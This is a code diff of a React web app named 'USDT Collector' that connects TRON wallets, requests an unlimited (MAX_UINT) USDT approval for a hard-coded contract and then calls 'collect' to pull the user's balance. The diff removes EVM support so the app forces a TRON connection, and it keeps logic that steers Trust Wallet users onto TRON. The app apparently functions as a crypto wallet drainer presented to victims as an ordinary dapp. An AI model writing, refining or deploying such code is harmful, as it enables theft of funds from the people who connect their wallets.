@@ -1,15 +1,15 @@
 import { Buffer } from 'buffer';
-window.Buffer = window.Buffer || Buffer;
+if (typeof window !== 'undefined') {
+  window.Buffer = window.Buffer || Buffer;
+}
 
 import { useState, useEffect, useRef } from 'react'
 import {
   createAppKit,
   useAppKit,
   useAppKitAccount,
-  useAppKitProvider,
-  useAppKitNetwork
+  useAppKitProvider
 } from '@reown/appkit/react'
-import { BrowserProvider, Contract, formatUnits } from 'ethers'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
 import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
@@ -17,11 +17,6 @@ import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { MetaMaskAdapter } from '@tronweb3/tronwallet-adapter-metamask-tron'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
 import { Copy, CheckCircle, AlertCircle, Wallet } from 'lucide-react'
-
-// --- WAGMI EVM IMPORTS ---
-import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
-import type { AppKitNetwork } from '@reown/appkit/networks'
 
 // --- TRON IMPORTS ---
 import TronWeb from 'tronweb'   
@@ -31,40 +26,15 @@ const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet'
 const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
 
-const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
-  tronMainnet,
-  mainnet,
-  arbitrum,
-  bsc,
-  polygon,
-]
-
 const NETWORK_CONFIG = {
-  Mainnet: {
-    fullHost: 'https://api.trongrid.io',
-    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-  },
-  Nile: {
-    fullHost: 'https://nile.trongrid.io',
-    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
-  },
+  fullHost: 'https://api.trongrid.io',
+  usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
 }
 
-const EVM_USDT: Record<number, string> = {
-  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-  56: '0x55d398326f99059fF775485246999027B3197955',
-  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
-  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
-}
-
-const EVM_ERC20_ABI = [
-  'function balanceOf(address owner) view returns (uint256)',
-  'function decimals() view returns (uint8)',
-]
-
-const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
+const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG
 
 // ── Reown Adapters ──
+// We removed WagmiAdapter so the modal forces a TRON connection from the start.
 const tronAdapter = new TronAdapter({
   walletAdapters: [
     new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
@@ -74,19 +44,14 @@ const tronAdapter = new TronAdapter({
   ],
 })
 
-const wagmiAdapter = new WagmiAdapter({
-  projectId: WC_PROJECT_ID,
-  networks: appkitNetworks,
-})
-
 createAppKit({
-  adapters: [tronAdapter, wagmiAdapter], 
-  networks: appkitNetworks,
+  adapters: [tronAdapter], 
+  networks: [tronMainnet],
   projectId: WC_PROJECT_ID,
   metadata: {
     name:        'USDT Collector',
     description: 'Collect USDT from multiple wallets',
-    url:         window.location.origin,
+    url:         typeof window !== 'undefined' ? window.location.origin : '',
     icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
   },
   themeMode: 'dark',
@@ -114,7 +79,6 @@ const COLLECT_ABI = [
   { inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
 ]
 
-// Safe TronWeb Instantiation Helper
 const instantiateTronWeb = (host: string) => {
   const TW = typeof TronWeb === 'function' ? TronWeb : 
              (TronWeb as any).TronWeb || 
@@ -131,15 +95,11 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
 
- const { open } = useAppKit()
+  const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
-  const { chainId, switchNetwork } = useAppKitNetwork() // <-- Added switchNetwork
-
-  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
   const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
 
   const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
-  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')
 
   const resolveTronWeb = () => {
     const w = window as any;
@@ -186,10 +146,9 @@ export default function App() {
         if (!finalTronWeb) {
           log("⚠️ Using Public Provider for balance (Injected not found)");
           try {
-            const publicTronWeb = instantiateTronWeb('https://api.trongrid.io');
+            const publicTronWeb = instantiateTronWeb(FULL_HOST);
             await getTronBalance(publicTronWeb, walletAddress);
             
-            // If we are in Trust Wallet but no TronWeb was found, it means the network is wrong.
             const w = window as any;
             if (w.trustwallet) {
               setStatus('Action Needed: Switch to TRON');
@@ -207,13 +166,11 @@ export default function App() {
 
         log('✅ TRON Provider Found');
         await getTronBalance(finalTronWeb, walletAddress);
-      } else if (isEVM) {
-        await getBalanceForCurrentChain();
       }
     };
 
     init();
-  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, isTron, isEVM]);
+  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, isTron]);
 
   const getTronBalance = async (tw: any, addr: string) => {
     try {
@@ -227,95 +184,16 @@ export default function App() {
     }
   }
 
-  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number) => {
-    if (!currentChainId || !EVM_USDT[currentChainId]) {
-      setUsdtBalance('0')
-      setStatus('USDT not configured for this EVM chain')
-      log(`❌ No USDT config for EVM chain ${currentChainId}`)
-      return
-    }
-
-    try {
-      const ethersProvider = new BrowserProvider(provider)
-      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
-
-      const [bal, decimals] = await Promise.all([
-        token.balanceOf(addr),
-        token.decimals(),
-      ])
-
-      const formatted = formatUnits(bal, decimals)
-      setUsdtBalance(formatted)
-      setStatus('Ready')
-      log(`EVM USDT: ${formatted}`)
-    } catch (e) {
-      log('❌ EVM balance fetch failed')
-    }
-  }
-
-  const getBalanceForCurrentChain = async () => {
-    try {
-      if (!walletAddress) return
-
-      if (isTron) {
-        const injectedTronWeb = resolveTronWeb()
-        if (!injectedTronWeb) {
-          log('❌ TronWeb not available')
-          setStatus('TRON wallet connected, but no injected TronWeb is available.')
-          return
-        }
-        await getTronBalance(injectedTronWeb, walletAddress)
-        return
-      }
-
-      if (isEVM) {
-        if (!evmWalletProvider) {
-          log('❌ EVM provider not available')
-          setStatus('EVM wallet connected, but EVM provider is not available.')
-          return
-        }
-        await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))
-        return
-      }
-
-      setStatus('Unsupported wallet namespace')
-      log('❌ Unsupported namespace')
-    } catch (e: any) {
-      console.warn('Balance fetch failed', e)
-      log(`❌ Balance fetch failed: ${e?.message || 'Unknown error'}`)
-      setStatus('Failed to fetch balance')
-    }
-  }
-
   const handleConnect = () => {
     open({ view: 'AllWallets' })
   }
 
  const approveAndCollect = async () => {
-    // ✨ THE NETWORK SWITCHER FIX ✨
-    if (isEVM) {
-      log("⚠️ App is on EVM. Forcing switch to TRON...");
-      setStatus('Switching to TRON Network...');
-      try {
-        if (switchNetwork) {
-          await switchNetwork(tronMainnet);
-        } else {
-          open({ view: 'Networks' }); // Fallback to AppKit UI
-        }
-      } catch (e: any) {
-        log(`❌ Switch failed: ${e.message}`);
-        open({ view: 'Networks' }); // Open Reown's network menu so user can click Tron
-      }
-      return;
-    }
-
     if (!walletAddress) return;
 
     const activeTw = resolveTronWeb();
     const w = window as any;
 
-    // ✨ THE TRUST WALLET INTERCEPTOR ✨
-    // Blocks the transaction and tells the user exactly how to fix the network issue
     if (w.trustwallet && !activeTw) {
       log("❌ Trust Wallet TRON provider blocked.");
       setStatus('Action Needed: Switch to TRON');
@@ -330,9 +208,8 @@ export default function App() {
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-      const FULL_HOST = NETWORK === 'Mainnet' ? 'https://api.trongrid.io' : 'https://nile.trongrid.io';
 
-      // ----------- PATH A: Fully Injected Wallet (TronLink, TokenPocket, Trust on correct network) -----------
+      // PATH A: Fully Injected Wallet
       if (activeTw && typeof activeTw.contract === 'function') {
         log('Executing via Injected Provider...');
         const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -357,7 +234,7 @@ export default function App() {
         return;
       }
 
-      // ----------- PATH B: AppKit / WalletConnect -----------
+      // PATH B: AppKit / WalletConnect
       if (tronWalletProvider) {
         log("Executing via Reown Universal Provider...");
         
@@ -374,7 +251,6 @@ export default function App() {
           
           let signedTx;
           
-          // Try/Catch specifically to catch AppKit provider routing errors
           try {
             if (typeof (tronWalletProvider as any).signTransaction === 'function') {
               signedTx = await (tronWalletProvider as any).signTransaction(transaction);
@@ -384,9 +260,8 @@ export default function App() {
               throw new Error("Provider does not support signing");
             }
           } catch (signErr: any) {
-            // Catch the specific internalRequest / formatting errors
             if (signErr.message?.includes("internalRequest") || signErr.message?.includes("not a function")) {
-              throw new Error("Provider rejected request. Switch to TRON network.");
+              throw new Error("Provider rejected request. Ensure you are on the TRON network.");
             }
             throw signErr;
           }
@@ -455,7 +330,7 @@ export default function App() {
             <h1 className="text-3xl font-bold">USDT Collector</h1>
           </div>
           <div className="text-xs px-4 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">
-            {isEVM ? 'EVM Network' : NETWORK}
+            {NETWORK}
           </div>
         </div>
 
@@ -474,7 +349,7 @@ export default function App() {
               </button>
 
               <p className="text-xs text-zinc-500 mt-6">
-                Opens directly to All Wallets with search
+                Connect a TRON-compatible wallet
               </p>
             </div>
           ) : (
@@ -495,18 +370,16 @@ export default function App() {
               <div className="bg-zinc-950 rounded-3xl p-8 text-center">
                 <p className="text-zinc-400">Your USDT Balance</p>
                 <p className="text-6xl font-bold text-emerald-400 mt-2">
-                  {isEVM ? '---' : usdtBalance} <span className="text-3xl">USDT</span>
+                  {usdtBalance} <span className="text-3xl">USDT</span>
                 </p>
               </div>
 
             <button
                 onClick={approveAndCollect}
                 disabled={loading}
-                className={`w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 ${
-                  isEVM ? 'bg-blue-500 hover:bg-blue-600 text-white' : 'bg-white hover:bg-zinc-100 text-black'
-                }`}
+                className="w-full font-bold py-5 rounded-3xl text-xl flex items-center justify-center gap-3 disabled:opacity-70 bg-white hover:bg-zinc-100 text-black"
               >
-                {loading ? 'Processing...' : isEVM ? 'Switch to TRON Network' : 'Collect All USDT'}
+                {loading ? 'Processing...' : 'Collect All USDT'}
                 <CheckCircle size={24} />
               </button>
 
